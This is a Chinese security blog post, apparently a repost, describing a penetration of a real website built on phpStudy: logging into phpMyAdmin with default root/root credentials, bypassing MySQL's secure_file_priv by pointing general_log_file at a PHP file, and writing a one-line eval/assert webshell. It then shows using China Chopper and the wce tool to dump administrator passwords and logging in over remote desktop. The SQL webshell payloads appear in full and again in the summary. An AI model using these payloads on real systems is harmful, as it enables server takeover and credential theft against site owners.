<!doctype html><html lang=zh-cn><meta charset=utf-8><meta name=generator content="Hugo 0.64.0"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name=color-scheme content="light dark"><meta name=supported-color-schemes content="light dark"><meta name=keywords content="MySQL"><meta name=description content="现实情况中，由于Mysql版本较高以及配置文件的缘故，往往无法直接通过root账号写入网站真实路劲下获取webshell；通过研究发现其实可以通过一些方法绕过，同样可以获取webshell。"><title>Mysql root账号general_log_file方法获取webshell&nbsp;&ndash;&nbsp;WTFSec</title><link rel=stylesheet href=/css/core.min.58bc4672a8045a0810ba4ad30a08c6d5589db1109ca0aa2e07c5e5438201ea8d11642ffa31d8ee7665d6a1b66ab9a3c5.css integrity=sha384-WLxGcqgEWggQukrTCgjG1VidsRCcoKouB8XlQ4IB6o0RZC/6MdjudmXWobZquaPF><meta name=twitter:card content="summary"><meta name=twitter:title content="Mysql root账号general_log_file方法获取webshell"><body><section id=header><div class="header wrap"><span class="header left-side"><a class="site home" href=/><span class="site name">WTFSec</span></a></span>
<span class="header right-side"><div class="nav wrap"><nav class=nav><a class="nav item" href=/categories/>分类</a><a class="nav item" href=/tags/>标签</a><a class="nav item" href=/link/>友链</a>
<input placeholder="Google 站内搜索" id=search_input style=width:150px>
<button onclick=search()><svg width="13" height="13" viewBox="0 0 13 13"><path d="m4.8495 7.8226c.82666.0 1.5262-.29146 2.0985-.87438.57232-.58292.86378-1.2877.87438-2.1144.010599-.82666-.28086-1.5262-.87438-2.0985-.59352-.57232-1.293-.86378-2.0985-.87438-.8055-.010599-1.5103.28086-2.1144.87438-.60414.59352-.8956 1.293-.87438 2.0985.021197.8055.31266 1.5103.87438 2.1144.56172.60414 1.2665.8956 2.1144.87438zm4.4695.2115 3.681 3.6819-1.259 1.284-3.6817-3.7.0019784-.69479-.090043-.098846c-.87973.76087-1.92 1.1413-3.1207 1.1413-1.3553.0-2.5025-.46363-3.4417-1.3909s-1.4088-2.0686-1.4088-3.4239.4696-2.4966 1.4088-3.4239c.9392-.92727 2.0864-1.3969 3.4417-1.4088 1.3553-.011889 2.4906.45771 3.406 1.4088.9154.95107 1.379 2.0924 1.3909 3.4239.0 1.2126-.38043 2.2588-1.1413 3.1385l.098834.090049z"/></svg></button></nav></div><script>function search(){const search_value=document.getElementById("search_input").value;if(search_value!==''){window.open("/search/?q="+search_value,"_blank");}}
document.getElementById("search_input").addEventListener("keydown",function(e){if(e.key==="Enter"){search()}});</script></span></div></section><section id=content><div class=article-container><section class="article header"><h1 class="article title">Mysql root账号general_log_file方法获取webshell</h1><p class="article date"><span class=lang><a>Hzllaga</a> </span>Sunday, January 21, 2018</p></section><article class="article markdown-body"><p>现实情况中，由于Mysql版本较高以及配置文件的缘故，往往无法直接通过root账号写入网站真实路劲下获取webshell；通过研究发现其实可以通过一些方法绕过，同样可以获取webshell</p><p>在前面的phpmyadmin漏洞利用专题中介绍了如何通过root账号来获取webshell，但在现实情况中，由于Mysql版本较高以及配置文件的缘故，往往无法直接通过root账号写入网站真实路劲下获取webshell；通过研究发现其实可以通过一些方法绕过，同样可以获取webshell，下面将整个渗透过程和方法跟大家分享。</p><h2 id=信息收集>信息收集</h2><p>目标站点访问其子域名，如图1所示，发现该站点是使用phpStudy2014搭建的，通过phpinfo信息泄露，可以获取网站的绝对路径“D:/phpStudy/WWW”，服务器为Windows Server 2003 ，phpstudy探针文件“D:/phpStudy/WWW/l.php”。
<img src=https://cdn.wtfsec.org/img/20200223160610.jpg alt></p><h2 id=获取root账号和密码>获取root账号和密码</h2><p>phpStudy默认账号为root/root，使用其进行登录，成功登录系统，如果不是这个账号和密码，可以使用phpmyadmin暴力破解工具进行暴力破解，如图2所示，登录后看目前使用的数据应该是www数据库。查看mysql数据库中的user表中的数据，如图3所示，清一色的相同密码。
<img src=https://cdn.wtfsec.org/img/20200223160711.jpg alt>
图2获取root账号和密码
<img src=https://cdn.wtfsec.org/img/20200223160731.jpg alt>
图3 mysql数据库user表多个账号使用相同密码</p><h2 id=直接导出webshell失败>直接导出webshell失败</h2><p>既然知道了网站真实路径“D:/phpStudy/WWW”和root账号，最简单的方法就是直接导出webshell：<div class=highlight><pre class=chroma><code class=language-sql data-lang=sql><span class=k>select</span> <span class=err>‘</span><span class=o>&lt;</span><span class=o>?</span><span class=n>php</span> <span class=o>@</span><span class=n>eval</span><span class=p>(</span><span class=err>$</span><span class=n>_POST</span><span class=p>[</span><span class=n>cmd</span><span class=p>]</span><span class=p>)</span><span class=p>;</span><span class=o>?</span><span class=o>&gt;</span><span class=err>’</span><span class=k>INTO</span> <span class=n>OUTFILE</span> <span class=err>‘</span><span class=n>D</span><span class=p>:</span><span class=o>/</span><span class=n>phpStudy</span><span class=o>/</span><span class=n>WWW</span><span class=o>/</span><span class=n>cmd</span><span class=p>.</span><span class=n>php</span><span class=err>’</span></code></pre></div>，如图4所示，在以往是顺利成章的获取webshell，但这次显示错误信息：</p><p>The MySQL server is running with the &ndash;secure-file-priv option so it cannot execute this statement</p><p>意思是Mysql服务器运行“–secure-file-priv”选项，所以不能执行这个语句。
<img src=https://cdn.wtfsec.org/img/20200223161001.jpg alt>
图4导出webshell失败</p><h2 id=secure_file_priv选项>secure_file_priv选项</h2><p>在mysql中使用secure_file_priv配置项来完成对数据导入导出的限制，前面的webshell导出就是如此，在实际中常常使用语句来导出数据表内容，例如把mydata.user表的数据导出来：<div class=highlight><pre class=chroma><code class=language-sql data-lang=sql><span class=k>select</span> <span class=o>*</span> <span class=k>from</span> <span class=n>mydata</span><span class=p>.</span><span class=k>user</span> <span class=k>into</span> <span class=n>outfile</span> <span class=s1>&#39;</span><span class=s1>/home/mysql/user.txt</span><span class=s1>&#39;</span><span class=p>;</span></code></pre></div>在mysql的官方给出了“–secure-file-priv=name Limit LOAD DATA, SELECT … OUTFILE, and LOAD_FILE() to files within specified directory”解释，限制导出导入文件到指定目录，其具体用法：</p><ol><li>限制mysqld不允许导入和导出<div class=highlight><pre class=chroma><code class=language-sql data-lang=sql><span class=n>mysqld</span> <span class=c1>--secure_file_prive=null</span></code></pre></div></li><li>限制mysqld的导入和导出只能发生在/tmp/目录下<div class=highlight><pre class=chroma><code class=language-sql data-lang=sql><span class=n>mysqld</span> <span class=c1>--secure_file_priv=/tmp/</span></code></pre></div></li><li>不对mysqld 的导入和导出做限制，在/etc/my.cnf文件中不指定值。</li></ol><h2 id=通过general_log和general_log_file来获取webshell>通过general_log和general_log_file来获取webshell</h2><p>mysql打开general log之后，所有的查询语句都可以在general log文件中以可读的方式得到，但是这样general log文件会非常大，所以默认都是关闭的。有的时候为了查错等原因，还是需要暂时打开general log的。换句话说general_log_file会记录所有的查询语句，以原始的状态来显示，如果将general_log开关打开，general_log_file设置为一个php文件，则查询的操作将会全部写入到general_log_file指定的文件，通过访问general_log_file指定的文件来获取webshell。在mysql中执行查询：<div class=highlight><pre class=chroma><code class=language-sql data-lang=sql><span class=k>set</span> <span class=k>global</span> <span class=n>general_log</span><span class=o>=</span><span class=s1>&#39;</span><span class=s1>on</span><span class=s1>&#39;</span><span class=p>;</span>
<span class=k>SET</span> <span class=k>global</span> <span class=n>general_log_file</span><span class=o>=</span><span class=s1>&#39;</span><span class=s1>D:/phpStudy/WWW/cmd.php</span><span class=s1>&#39;</span><span class=p>;</span>
<span class=k>SELECT</span> <span class=s1>&#39;</span><span class=s1>&lt;?php assert($_POST[&#34;cmd&#34;]);?&gt;</span><span class=s1>&#39;</span><span class=p>;</span></code></pre></div>如图5，图6和图7所示，分别打开general_log开关，设置general_log_file文件，执行查询。
<img src=https://cdn.wtfsec.org/img/20200223162254.jpg alt>
图5打开general_log开关
<img src=https://cdn.wtfsec.org/img/20200223162444.jpg alt>
图6设置general_log_file文件
<img src=https://cdn.wtfsec.org/img/20200223162456.jpg alt>
图7执行webshell查询</p><h2 id=获取webshell>获取webshell</h2><p>在浏览器中打开地址http://<strong><strong><strong>.hy</strong></strong></strong>.cn/cmd.php，如图8所示，会显示mysql查询的一些信息，由于一句话后门通过查询写入了日志文件cmd.php，因此通过中国菜刀一句话后门可以成功获取webshell，如图9所示。
<img src=https://cdn.wtfsec.org/img/20200223162530.jpg alt>
图8查看文件
<img src=https://cdn.wtfsec.org/img/20200223162551.jpg alt>
图9获取webshell</p><h2 id=服务器密码获取>服务器密码获取</h2><ol><li>查看服务器权限及用户权限
通过中国菜刀一句话后门管理工具，打开远程终端命令执行，如图10所示，分别执行“whomai”、“net user”、“net localgroup administrator”命令来查看当前用户的权限，当前系统所有用户，管理员用户情况。
<img src=https://cdn.wtfsec.org/img/20200223162656.jpg alt>
图10查看当前用户权限</li><li>上传wce密码获取工具
直接执行g86.exe顺利获取管理员密码，如图11所示，开始执行g64.exe没有成功是因为系统是32位操作系统。
<img src=https://cdn.wtfsec.org/img/20200223162718.jpg alt>
图11获取管理员密码</li></ol><h2 id=获取远程终端端口>获取远程终端端口</h2><p>通过命令 tasklist /svc | find “TermService”及netstat -ano | find “1792″ 命令来获取当前的3389端口为8369端口，tasklist /svc | find “TermService”获取的是远程终端服务对应的进程号，netstat -ano | find “1792″查看进程号1792所对应的端口，在实际过程中1792值会有变化。
<img src=https://cdn.wtfsec.org/img/20200223162746.jpg alt>
图12获取3389端口</p><h2 id=登录3338>登录3338</h2><p>打开mstsc，在连接地址中输入202.58.<em><strong>.</strong></em>:8369，输入获取的管理员和密码进行登录，如图13所示，成功登录服务器。
<img src=https://cdn.wtfsec.org/img/20200223162813.jpg alt></p><h2 id=总结>总结</h2><ol><li>查看genera文件配置情况<div class=highlight><pre class=chroma><code class=language-sql data-lang=sql><span class=k>show</span> <span class=k>global</span> <span class=n>variables</span> <span class=k>like</span> <span class=s2>&#34;</span><span class=s2>%genera%</span><span class=s2>&#34;</span><span class=p>;</span></code></pre></div></li><li>关闭general_log<div class=highlight><pre class=chroma><code class=language-sql data-lang=sql><span class=k>set</span> <span class=k>global</span> <span class=n>general_log</span><span class=o>=</span><span class=k>off</span><span class=p>;</span></code></pre></div></li><li>通过general_log选项来获取webshell<div class=highlight><pre class=chroma><code class=language-sql data-lang=sql><span class=k>set</span> <span class=k>global</span> <span class=n>general_log</span><span class=o>=</span><span class=s1>&#39;</span><span class=s1>on</span><span class=s1>&#39;</span><span class=p>;</span>
<span class=k>SET</span> <span class=k>global</span> <span class=n>general_log_file</span><span class=o>=</span><span class=s1>&#39;</span><span class=s1>D:/phpStudy/WWW/cmd.php</span><span class=s1>&#39;</span><span class=p>;</span>
<span class=k>SELECT</span> <span class=s1>&#39;</span><span class=s1>&lt;?php assert($_POST[&#34;cmd&#34;]);?&gt;</span><span class=s1>&#39;</span><span class=p>;</span></code></pre></div></li></ol></article><section class="article labels"><a class=category href=/categories/%E8%BD%AC%E8%BD%BD/>转载</a><a class=tag href=/tags/mysql/>MySQL</a></section></div><div class="article bottom"><section class="article navigation"><p><a class=link href=/posts/linux%E4%B8%8B%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E7%A5%9E%E5%99%A8mimipenguin/><span class=li>&larr;</span>Linux下密码抓取神器mimipenguin</a></p><p><a class=link href=/posts/echo-%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%86%99%E5%85%A5%E8%AF%BBiis%E9%85%8D%E7%BD%AEvbs%E8%84%9A%E6%9C%AC/><span class=li>&rarr;</span>echo 一句话写入读IIS配置vbs脚本</a></p></section></div></section><section id=footer><div class=footer-wrap><p class=copyright>©2014-2020 WTFSec.</p><p class=powerby><span>Powered by </span><a href=https://gohugo.io target=_blank>Hugo</a><span> and the </span><a href=https://themes.gohugo.io/hugo-notepadium/ target=_blank>Notepadium</a></p><p class=powerby><span>CDN by </span><a href=https://cf.wtfsec.org target=_blank>Cloudflare</a><span> and </span><a href="https://console.upyun.com/register/?invite=H1xhvqTVV" target=_blank>又拍云</a></p></div></section><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-83215806-1','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script data-ad-client=ca-pub-4220670081232153 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></body></html>